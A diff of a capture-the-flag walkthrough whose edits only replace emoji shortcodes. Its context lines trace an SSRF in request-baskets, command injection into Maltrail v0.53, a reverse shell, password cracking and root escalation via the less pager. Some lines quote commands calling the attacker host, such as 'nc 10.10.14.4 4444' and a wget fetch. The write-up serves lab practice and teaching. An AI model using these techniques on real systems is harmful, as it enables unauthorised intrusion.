@@ -244,9 +244,9 @@ function acceptSharedBasket() {
     }
 ```
 
-:point_up: Ok, so `/web/web` was not a mistake. It's used for accepting a link to a basket that has been shared with the user by another user.
+☝️ Ok, so `/web/web` was not a mistake. It's used for accepting a link to a basket that has been shared with the user by another user.
 
-> :bulb: Given the slightly janky way that many of the requests to the API get built/parsed, my early bet is that there is some kind of broken authentication on the site.
+> 💡 Given the slightly janky way that many of the requests to the API get built/parsed, my early bet is that there is some kind of broken authentication on the site.
 
 
 
@@ -277,7 +277,7 @@ I'll try just using the site normally to get a better feel for how it works; I'l
 
 ![basket 1](basket%201.png)
 
-It looks like the app also has the ability to proxy any requests. This might be interesting. Perhaps there's a way to use this to do some kind of SSRF? I'll investigate this after a bit more recon :triangular_flag_on_post:
+It looks like the app also has the ability to proxy any requests. This might be interesting. Perhaps there's a way to use this to do some kind of SSRF? I'll investigate this after a bit more recon 🚩
 
 ![basket configuration](basket%20configuration.png)
 
@@ -299,7 +299,7 @@ Hmm, nope. I'm probably doing something wrong on my end. I'll check online to se
 
 > request-baskets up to v1.2.1 was discovered to contain a Server-Side  Request Forgery (SSRF) via the component /api/baskets/{name}. This vulnerability allows attackers to access network resources and sensitive information via a crafted API request. 
 
-:thumbsup: Excellent - I wasn't too far off the mark. 
+👍 Excellent - I wasn't too far off the mark. 
 
 
 
@@ -452,7 +452,7 @@ I think it's safe to say that the SSRF is not working: these results match the r
 - `insecure_tls` shouldn't matter at all, because we're not forwarding to a server using `https`
 - `expand_path` seems like it will be very useful for performing directory traversal. If it's working already, why not keep it on?
 - `capacity` shouldn't matter either: it's just the number of requests held in the "bucket", so shouldn't have an effect on forwarding.
-- *... maybe `proxy_response` is the problem?* :thinking:
+- *... maybe `proxy_response` is the problem?* 🤔
 
 To try this out, I changed `proxy_response` to `True` in the script:
 
@@ -480,7 +480,7 @@ Excellent! port 80 has an index page with title *Maltrail*. I wonder what it is.
 
 ### Port 80 (filtered)
 
-Looks like styles maybe didn't load, but that's definitely a different website! :clap: Most importantly, we see that it is a service called **Maltrail (v0.53)**. The links at the top of the page all point to [the Maltrail github repo](https://github.com/stamparm/maltrail). Since this is http, it's probably a good idea to try directory enumeration:
+Looks like styles maybe didn't load, but that's definitely a different website! 👏 Most importantly, we see that it is a service called **Maltrail (v0.53)**. The links at the top of the page all point to [the Maltrail github repo](https://github.com/stamparm/maltrail). Since this is http, it's probably a good idea to try directory enumeration:
 
 ![ssrf directory enum](ssrf%20directory%20enum.png)
 
@@ -541,9 +541,9 @@ I tried several commands to test the injection (including the URL-encoded versio
 
 ![ssrf attempt 4](ssrf%20attempt%204.png)
 
-Oh, I see: First of all, it's posting to `/login`. Also, there's a hash with a nonce. Thankfully, since it's only the password field that isn't present in the request, there's a good chance that  the hash was only taken for the password. If this is true, sending the same hash every time should be fine, as long as the server isn't actually checking for a unique nonce :eyes:...  Also, it probably makes sense to URL-encode the whole command.
+Oh, I see: First of all, it's posting to `/login`. Also, there's a hash with a nonce. Thankfully, since it's only the password field that isn't present in the request, there's a good chance that  the hash was only taken for the password. If this is true, sending the same hash every time should be fine, as long as the server isn't actually checking for a unique nonce 👀...  Also, it probably makes sense to URL-encode the whole command.
 
-> :scream: I also realized that I forgot to include backticks in the command! No wonder nothing was running. I'm not sure if adding the nonce/hash was useful, but the rest of the modifications seemed to work.
+> 😱 I also realized that I forgot to include backticks in the command! No wonder nothing was running. I'm not sure if adding the nonce/hash was useful, but the rest of the modifications seemed to work.
 
 To accommodate these discoveries, I modified the script into the following **<u>final</u>** version:
 
@@ -625,7 +625,7 @@ With the modifications to the script complete, I'll try it again:
 
 ![command injection 2](command%20injection%203.png)
 
-:grin: Alright! Looks like I've got command injection. My attempts with `nc 10.10.14.4 4444` and `wget http://10.10.14.4:8000` were both successful:
+😁 Alright! Looks like I've got command injection. My attempts with `nc 10.10.14.4 4444` and `wget http://10.10.14.4:8000` were both successful:
 
 ![command injection 2](command%20injection%202.png)
 
@@ -641,7 +641,7 @@ Let's turn this command injection into a full reverse shell. It should be as sim
 
 ![command injection 6](command%20injection%206.png)
 
-There we go! Worked first try :thumbsup:
+There we go! Worked first try 👍
 
 
 
@@ -710,7 +710,7 @@ Now, I'll enumerate the user. As always, in an effort to keep the walkthrough br
 
 - `puma` holds the user flag
 
-- `netstat -tulpn` showed a very odd entry:  :triangular_flag_on_post:
+- `netstat -tulpn` showed a very odd entry:  🚩
 
   ```bash
   (Not all processes could be identified, non-owned process info
@@ -774,7 +774,7 @@ Where is `server.py`? I'll go take a look at it:
 find / -name "server.py" 2>dev/null
 ```
 
-Oh! it's in `/opt/maltrail` :scream: This is the directory I was dropped into from the initial reverse shell! Now I feel foolish.
+Oh! it's in `/opt/maltrail` 😱 This is the directory I was dropped into from the initial reverse shell! Now I feel foolish.
 
 It looks like `server.py` mentions a config file:
 
@@ -815,7 +815,7 @@ In less than a second, the password was cracked:
 
 ![cracked password](cracked%20password.png)
 
-Awesome! *Thanks, John!* :joy: Now that we have a (hopefully root) credential, let's try it with SSH:
+Awesome! *Thanks, John!* 😂 Now that we have a (hopefully root) credential, let's try it with SSH:
 
 ```bash
 ssh root@$RADDR
@@ -829,13 +829,13 @@ ssh root@$RADDR
 
 Perhaps the service itself is vulnerable? I've already investigated its configuration. It runs python, but at a fixed/absolute path where `puma` does not have write access to. The service just opens up some logging.
 
-Oh! OH... :flushed: I should have realized this earlier, when I first ran it: *running that service automatically opens the results in pager*! For this box (and most systems) the pager is `less`. I was already familiar with this privilege escalation, but those unaware should check out [this page of GTFObins](https://gtfobins.github.io/gtfobins/less/) for more detail (the very first entry on the page). 
+Oh! OH... 😳 I should have realized this earlier, when I first ran it: *running that service automatically opens the results in pager*! For this box (and most systems) the pager is `less`. I was already familiar with this privilege escalation, but those unaware should check out [this page of GTFObins](https://gtfobins.github.io/gtfobins/less/) for more detail (the very first entry on the page). 
 
 There is a convenience feature of `less` similar to several other full-screen programs that allows the user to run shell commands from within it by prefixing the command with a '!'. For example, `!id`:
 
 ![privesc 1](privesc%201.png)
 
-:tada: From there, simply `cat` out the flag for those sweet root flag points! Congratulations. 
+🎉 From there, simply `cat` out the flag for those sweet root flag points! Congratulations. 
 
 
 
@@ -862,7 +862,7 @@ From the attacker box, use SSH to log in as root with the newly-generated key:
 
 ![root ssh](root%20ssh.png)
 
-:sunglasses: There it is: full root access over SSH!
+🕶️ There it is: full root access over SSH!
 
 
 
